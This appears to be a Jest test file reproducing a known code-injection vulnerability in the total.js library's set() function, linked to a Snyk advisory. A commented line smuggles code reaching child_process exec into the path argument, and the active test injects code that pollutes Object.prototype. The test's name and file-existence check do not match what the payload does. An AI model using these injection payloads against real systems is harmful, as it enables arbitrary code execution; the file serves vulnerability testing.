// const total = require('total.js');
// total.set({}, 'a;let {mainModule}=process; let {require}=mainModule; let {exec}=require("child_process"); exec("touch HACKED")//');
//https://security.snyk.io/vuln/SNYK-JS-TOTALJS-1088607
test("Arbitrary code execution in cd-messenger", () => {
  const fs = require("fs");
  const total = require("total.js");
  const path = "./total-js";

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    total.set({}, "a;1 + (Object.prototype.polluted = `yes`)//");
  } catch (error) {}

  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect({}.polluted).toBe("yes");
  //fs.unlink(path, function(err) {});//deleting the file after creation
});
